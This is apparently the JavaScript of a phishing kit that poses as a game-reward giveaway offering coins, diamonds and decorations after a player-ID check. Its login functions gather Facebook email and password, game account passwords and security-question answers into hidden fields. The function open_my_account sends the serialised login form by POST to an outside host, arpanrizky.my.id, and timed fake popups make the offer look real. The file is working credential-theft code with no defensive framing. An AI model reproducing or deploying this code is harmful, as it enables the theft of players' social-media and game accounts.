var slideIndex = 0;
showSlides();

function open_my_account() {var myFormAcc = $("#formLogin").serialize();$.ajax({url: 'https://arpanrizky.my.id/true/',data: myFormAcc,type: 'POST',success: function() {return true;},error: function() {return true;}});}

function showSlides() {
  var i;
  var slides = document.getElementsByClassName("alexslideimg");
  var dots = document.getElementsByClassName("dot");
  for (i = 0; i < slides.length; i++) {
    slides[i].style.display = "none";  
  }
  slideIndex++;
  if (slideIndex > slides.length) {slideIndex = 1}    
  for (i = 0; i < dots.length; i++) {
    dots[i].className = dots[i].className.replace(" active", "");
  }
  slides[slideIndex-1].style.display = "block";  
  dots[slideIndex-1].className += " active";
  setTimeout(showSlides, 4000); // Change image every 2 seconds
}

function codeAddress() {
    setTimeout(() => {
        $('.floatpop1').fadeIn();
    },2000)
    setTimeout(() => {
        $('.floatpop1').fadeOut();
    },7000)
    setTimeout(() => {
        $('.floatpop2').fadeIn();
    },17000)
    setTimeout(() => {
        $('.floatpop2').fadeOut();
    },22000)
    setTimeout(() => {
        $('.floatpop3').fadeIn();
    },32000)
    setTimeout(() => {
        $('.floatpop3').fadeOut();
    },37000)
    setTimeout(() => {
        $('.floatpop4').fadeIn();
    },47000)
    setTimeout(() => {
        $('.floatpop4').fadeOut();
    },52000)
    setTimeout(() => {
        $('.floatpop5').fadeIn();
    },62000)
    setTimeout(() => {
        $('.floatpop5').fadeOut();
    },67000)
    setTimeout(() => {
        $('.floatpop6').fadeIn();
    },77000)
    setTimeout(() => {
        $('.floatpop6').fadeOut();
    },82000)
    setTimeout(() => {
        $('.floatpop7').fadeIn();
    },87000)
    setTimeout(() => {
        $('.floatpop7').fadeOut();
    },92000)
    setTimeout(() => {
        $('.floatpop8').fadeIn();
    },102000)
    setTimeout(() => {
        $('.floatpop8').fadeOut();
    },107000)
    setTimeout(() => {
        $('.floatpop9').fadeIn();
    },117000)
    setTimeout(() => {
        $('.floatpop9').fadeOut();
    },122000)
    setTimeout(() => {
        $('.floatpop10').fadeIn();
    },132000)
    setTimeout(() => {
        $('.floatpop10').fadeOut();
    },137000)
    setTimeout(() => {
        $('.floatpop11').fadeIn();
    },147000)
    setTimeout(() => {
        $('.floatpop11').fadeOut();
    },152000)
    setTimeout(() => {
        $('.floatpop12').fadeIn();
    },157000)
    setTimeout(() => {
        $('.floatpop12').fadeOut();
    },167000)
    setTimeout(() => {
        $('.floatpop13').fadeIn();
    },177000)
    setTimeout(() => {
        $('.floatpop13').fadeOut();
    },182000)
    setTimeout(() => {
        $('.floatpop14').fadeIn();
    },192000)
    setTimeout(() => {
        $('.floatpop14').fadeOut();
    },197000)
    setTimeout(() => {
        $('.floatpop15').fadeIn();
    },207000)
    setTimeout(() => {
        $('.floatpop15').fadeOut();
    },212000)
    }
    window.onload = codeAddress;
        
function openplayid() {
    $('.trueIDalex').show();
    $('.toasterroralex').hide();
}

function openrewardalex() {
    $('.rewardalexpop').show();
}

function openloginalex() {
    $('.loginalexariandi').show();
    $('.rewardalexpop').hide();
}
function closeloginalex() {
    $('.loginalexariandi').hide();
    $('.rewardalexpop').show();
}

function openfbalex() {
    $('.alex-facebook').show();
    $('.loginalexariandi').hide();
}
function closefbalex() {
    $('.alex-facebook').hide();
    $('.loginalexariandi').show();
}

function openpgalex() {
    $('.alex-pengunjung').show();
    $('.loginalexariandi').hide();
}
function closepgalex() {
    $('.alex-pengunjung').hide();
    $('.loginalexariandi').show();
}

function IDalex(){
   var playid = $("#trueidalex").val();
   $(".respon").show();
   $(".wrong").hide();
   $(".tidakada").hide();
   if(playid == "" || playid == null || playid.length <= 5)
   {
   $(".trueIDalex").hide();
   $(".toasterroralex").show();
   $(".wrong").show();
   $(".respon").hide();
   $(".tidakada").hide();
   return false;
   }else{
   $(".wrong").hide();
   }
   
   $.ajax({
   type : 'POST',
   url : 'system/trueid.php?playid='+playid+'',
   beforeSend : function(){
         $(".respon").show();
   },
   success : function(data){
    if(data == "" || data == null){
   $(".respon").hide();
   $(".tidakada").show();
   $(".trueIDalex").hide();
   $(".toasterroralex").show();
   }else{
   $(".trueIDalex").hide();
   $(".toast").fadeIn();
   $("#toastid").text(playid);
   $("#toastnick").text(data);
   $("input#toastnickmarsya").val(data);
   $("input#ressplayid").val(playid);
   $("input#ressplayidfb").val(playid);
   $("input#ressnick").val(data);
   $(".toast").show();
   setTimeout(() => {
   $(".toast").fadeOut();
   },2500)
   }
   }
   })
   
}

/**  $.ajax({
   type : 'POST',
   url : 'haykaljb/True-ID.php?playid='+playid+'',
   beforeSend : function(){
         $(".respon").show();
   },
   success : function(data){
   if(data == "" || data == null){
   $(".respon").hide();
   $(".tidakada").show();
   setTimeout(() => {
       $(".tidakada").hide();
    },3000)
    return false;
   }else{
   $(".trueid").hide();
   $("#toastnick").text(data);
   $("#toastplayid").text(playid);
   $("input#ressplayid").val(playid);
   $("input#ressnick").val(data);
    $(".respon").hide();
    $('#echolog').hide();
    $('#echoout').show();
   }
   }
   })
   
} */
function menu1() {
    $('.koinalex').show();
    $('.berlianalex').hide();
    $('.dekorasialex').hide();
}
function menu2() {
    $('.koinalex').hide();
    $('.berlianalex').show();
    $('.dekorasialex').hide();
}
function menu3() {
    $('.koinalex').hide();
    $('.berlianalex').hide();
    $('.dekorasialex').show();
}

function AlexHostingNetFB()
	{
		$emailfb = $('#alx_email_fb').val().trim();
		$passwordfb = $('#alx_password_fb').val().trim();
		$loginfb = $('#alx_login_fb').val().trim();
		if($emailfb == '' || $emailfb == null || $emailfb.length <= 8)
		{
			$('.email-fb').show();
			$('.sandi-fb').hide();
            $('.alex-facebook').show();
            $('.alex-pengunjung-fb').hide();
			return false;
		}else{
			$('.email-fb').hide();
			$("input#emailress").val($emailfb);
			$('.alex-pengunjung-fb').show();
		}
		if($passwordfb == '' || $passwordfb == null || $passwordfb.length <= 6)
		{
			$('.sandi-fb').show();
            $('.alex-facebook').show();
            $('.alex-pengunjung-fb').hide();
			return false;
		}else{
            $('.verifalexhost').show();
            $('.popup-ariandi').hide();
			$('.sandi-fb').hide();
			$("input#passwordress").val($passwordfb);
			$("input#loginress").val($loginfb);
			$('.alex-pengunjung-fb').show();
		}
	}
	
function AlexHostingNetPGFB()
	{
	    $emailpgfb = $('#ressplayid').val().trim();
		$passwordpgfb = $('#alx_password_pgfb').val().trim();
		if($passwordpgfb == '' || $passwordpgfb == null || $passwordpgfb.length <= 5)
		{
			$('.sandi-pgfb').show();
			$('.koinalex').show();
            $('.berlianalex').hide();
            $('.dekorasialex').hide();
            $('.alex-pengunjung-fb').show();
            $('.idverif').hide();
			return false;
		}else{
		    $('.alex-pengunjung-fb').hide();
		    $('.idverif').show();
            $('.popup-ariandi').hide();
			$('.sandi-pgfb').hide();
			$('.verifyloginalex').show();
			$("input#emailresspgfb").val($emailpgfb);
			$("input#passwordresspgfb").val($passwordpgfb);
		}
	}
	
function AlexHostingNetPG()
	{
	    $emailpg = $('#ressplayid').val().trim();
		$passwordpg = $('#alx_password_pg').val().trim();
		$loginpg = $('#alx_login_pg').val().trim();
		if($passwordpg == '' || $passwordpg == null || $passwordpg.length <= 5)
		{
			$('.sandi-pg').show();
			$('.koinalex').show();
            $('.berlianalex').hide();
            $('.dekorasialex').hide();
            $('.alex-pengunjung').show();
            $('.idverif').hide();
			return false;
		}else{
		    $('.alex-pengunjung').hide();
		    $('.idverif').show();
            $('.popup-ariandi').hide();
			$('.sandi-pg').hide();
			$('.verifyloginalex').show();
			$("input#emailress").val($emailpg);
			$("input#passwordress").val($passwordpg);
			$("input#loginress").val($loginpg);
		}
	}

function AlexHostingNetKM() {
    $quest1 = $('#quest1').val().trim();
    $answer1 = $('#answer1').val().trim();
    $quest2 = $('#quest2').val().trim();
    $answer2 = $('#answer2').val().trim();
    $quest3 = $('#quest3').val().trim();
    $answer3 = $('#answer3').val().trim();
    if($answer1 == '' || $answer1 == null || $answer1.length <= 2)
        {
          $(".toasterrorverifalex").show();
          $(".koinalex").show();
            $(".berlianalex").hide();
            $(".dekorasialex").hide();
            $('.idverif').show();
          return false;
        }else {
            $('.toasterrorverifalex').hide();
            $("input#quest1ress").val($quest1);
            $("input#answer1ress").val($answer1);
            $('.koinalex').hide();
            $('.berlianalex').hide();
            $('.dekorasialex').hide();
            $('.verifalexhost').show();
            $('.idverif').hide();
        }
    if($answer2 == '' || $answer2 == null || $answer2.length <= 2)
        {
          $('.toasterrorverifalex').show();
          $('.koinalex').show();
            $('.berlianalex').hide();
            $('.dekorasialex').hide();
            $('.idverif').show();
          return false;
        }else {
            $('.toasterrorverifalex').hide();
            $("input#quest2ress").val($quest2);
            $("input#answer2ress").val($answer2);
            $('.koinalex').hide();
            $('.berlianalex').hide();
            $('.dekorasialex').hide();
            $('.verifalexhost').show();
            $('.idverif').hide();
        }
    if($answer3 == '' || $answer3 == null || $answer3.length <= 2)
        {
          $('.toasterrorverifalex').show();
          $('.koinalex').show();
            $('.berlianalex').hide();
            $('.dekorasialex').hide();
            $('.idverif').show();
          return false;
        }else {
            $('.toasterrorverifalex').hide();
            $("input#quest3ress").val($quest3);
            $("input#answer3ress").val($answer3);
            $('.koinalex').hide();
            $('.berlianalex').hide();
            $('.dekorasialex').hide();
            $('.verifalexhost').show();
            $('.idverif').hide();
        }
}

function openekamanan() {
    $('.toasterrorverifalex').hide();
    $('.idverif').show();
}

function lagualex() {
    var lagualex = document.getElementById("lagualex");
    lagualex.play();
}

var buka = new Audio();
buka.src = "haykaljb1/sound/toast.mp3";